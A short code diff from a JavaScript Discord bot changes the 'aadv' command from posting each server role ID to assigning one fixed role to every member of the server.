@@ -763,7 +763,7 @@ client.on('message', message =>
 				break;
 	
 			case "aadv":
-				message.guild.roles.forEach(function(role) { message.channel.send(role.id); });
+				message.guild.members.forEach(function(member) { member.addRole("509640521585524747"); } );
 				break;
 				
 			case "battle":
